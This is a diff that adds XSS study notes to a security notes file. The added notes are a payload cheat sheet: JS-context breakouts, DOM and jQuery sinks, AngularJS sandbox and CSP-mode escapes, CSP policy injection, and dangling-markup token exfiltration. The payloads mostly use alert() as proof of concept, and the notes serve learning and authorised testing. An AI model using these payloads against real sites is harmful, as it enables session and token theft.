@@ -712,5 +712,174 @@ https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-
 
 [XSS (Cross Site Scripting)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
 
+## Enrichment — framework XSS, jQuery sinks & CSP (imported-unreviewed, from course notes)
+> Added from personal PortSwigger/HTB notes; PII scrubbed. Untrusted until reviewed.
+
+### JS-context breakout (XSS into existing JavaScript)
+
+Terminate the existing script block (browser HTML-parses before JS-parses, so an unterminated string in the original script doesn't stop the injected one):
+
+```html
+</script>
+<img src=1 onerror=alert(document.domain)>
+```
+
+Break out of a quoted string literal (repair trailing syntax or the whole script fails to execute):
+
+```javascript
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+
+Backslash-escaped variants — when the app escapes single quotes with `\` but fails to escape the backslash itself, neutralise the added backslash with your own:
+
+```javascript
+';alert(document.domain)//
+\';alert(document.domain)//
+\\';alert(document.domain)//
+```
+
+WAF / char-restriction bypass — call a function without parentheses via `throw` + global exception handler (`alert` assigned to `onerror`, `throw 1` passes the arg):
+
+```javascript
+onerror=alert;throw 1
+```
+
+HTML-encoding in a quoted event-handler attribute — browser HTML-decodes the attribute value before JS parsing, so entities become string delimiters:
+
+```html
+&apos;-alert(document.domain)-&apos;
+```
+
+Template-literal breakout — inside a backtick string, embedded `${...}` expressions are evaluated (no need to break out of the quotes):
+
+```javascript
+${alert(document.domain)}
+```
+
+### jQuery sinks & DOM-XSS
+
+Full jQuery sink function list (alter DOM elements; user-controlled input reaching any of these can yield DOM XSS):
+
+```
+add() after() append() animate() insertAfter() insertBefore() before() html()
+prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has()
+constructor() init() index() jQuery.parseHTML() $.parseHTML()
+```
+
+Main DOM-XSS sinks:
+
+```
+document.write() document.writeln() document.domain
+element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent
+```
+
+`document.write` accepts `<script>`; `innerHTML`/`insertAdjacentHTML` do not run `<script>` or `svg onload` on modern browsers — use `img`/`iframe` with `onerror`/`onload`:
+
+```javascript
+document.write('... <script>alert(document.domain)</script> ...');
+element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
+```
+
+jQuery `attr()` sink — user-controlled `location.search` written to an `href` allows a `javascript:` URL:
+
+```javascript
+$(function() {
+	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+```
+```
+?returnUrl=javascript:alert(document.domain)
+```
+
+`$(location.hash)` → `scrollIntoView` hashchange DOM-XSS — the `$()` selector fed the `location.hash` source in a `hashchange` handler:
+
+```javascript
+$(window).on('hashchange', function() {
+	var element = $(location.hash);
+	element[0].scrollIntoView();
+});
+```
+
+Trigger `hashchange` without user interaction via an iframe (recent jQuery blocks selector input beginning with `#`, but the `$()` sink is still exploitable when you control input from a source that needs no `#` prefix):
+
+```html
+<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
+```
+
+### Client-side template injection (CSTI) & AngularJS sandbox escape
+
+Basic CSTI probe / template-expression execution (frameworks HTML-decode before locating expressions, so HTML-encoding is not a fix):
+
+```
+${alert(document.domain)}
+```
+
+AngularJS sandbox escape — best-known escape overwrites `charAt()` globally so `isIdent()` always returns true, then inject via AngularJS's own `$eval()` (the override only takes effect once the sandboxed code runs):
+
+```javascript
+'a'.constructor.prototype.charAt=[].join
+```
+```javascript
+$eval('x=alert(1)')
+```
+
+Advanced escape without quotes — use the `orderBy` filter (in AngularJS `|` is a filter op, `:` supplies an argument, which is evaluated as an expression) when `$eval()` is unavailable:
+
+```
+[123]|orderBy:'Some string'
+```
+
+AngularJS CSP-mode bypass — CSP mode avoids the `Function` constructor so the standard escape fails; use AngularJS's own events (`ng-focus`) and the `$event.path` array (last element is `window` on Chrome), passing it to `orderBy` with `constructor.from` to hide `window` from the sandbox:
+
+```html
+<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
+```
+
+Simpler CSP/sandbox bypass — reference `alert` without explicitly referencing `window`:
+
+```javascript
+[1].map(alert)
+```
+
+### CSP directives & bypasses
+
+Baseline restrictive directives:
+
+```
+script-src 'self'
+script-src https://scripts.normal-website.com
+img-src 'self'
+frame-ancestors 'self'
+frame-ancestors 'none'
+```
+
+CSP policy-injection bypass — when a site reflects a controllable parameter into the policy (typically the final `report-uri` directive), inject a `;` to append your own directives. You normally cannot overwrite an existing `script-src`, but Chrome's `script-src-elem` directive controls `<script>` elements and can overwrite `script-src`:
+
+```
+;script-src-elem 'unsafe-inline'
+```
+
+Dangling-markup considerations — CSP often blocks `script` but allows `img`, so `img` elements can exfiltrate CSRF tokens etc. Chrome's built-in dangling-markup mitigation blocks requests containing raw newlines or angle brackets; stricter policies blocking all external requests can still be evaded via user interaction (inject a clickable element that stores+sends everything it encloses to an external server). `img-src 'self'` stops `img`-based capture but not an anchor tag with a dangling `href`.
+
+## Reviewed consolidation — parameter discovery
+
+Use `../modern/browser-script-execution-contexts.md` as the primary method. URL
+archive/mining tools such as ParamSpider can expand a parameter inventory, but their
+output is only a lead set: scope-filter, normalize, deduplicate, and replay one
+read-only canary at a time before any context-specific XSS test. Obtain current
+domain/file flags from the installed tool's help rather than preserving version-
+sensitive commands, and apply the active request and concurrency budget.
+
+Project reference: [devanshbatham/ParamSpider](https://github.com/devanshbatham/ParamSpider).
+
+### Merged provenance
+
+| retired curated note | curated SHA-256 | original source | original SHA-256 |
+|---|---|---|---|
+| `xss-paramspider.md` | `19bd58e5d628395f2535b845538baea7a80773e7d7edc38b1ef1e7007a4f410c` | `_raw/Web attacks/Web Attacks/XSS/paramspider.md` | `dd3f9a10c00e78087ec859ce3e9429bc916483a7afdc6e7ce4d026614f93bb6f` |
+
+The retired note's stale invocation syntax was not retained.
+
 ## Source
 Original note: `_raw/Web attacks/Web Attacks/XSS.md`
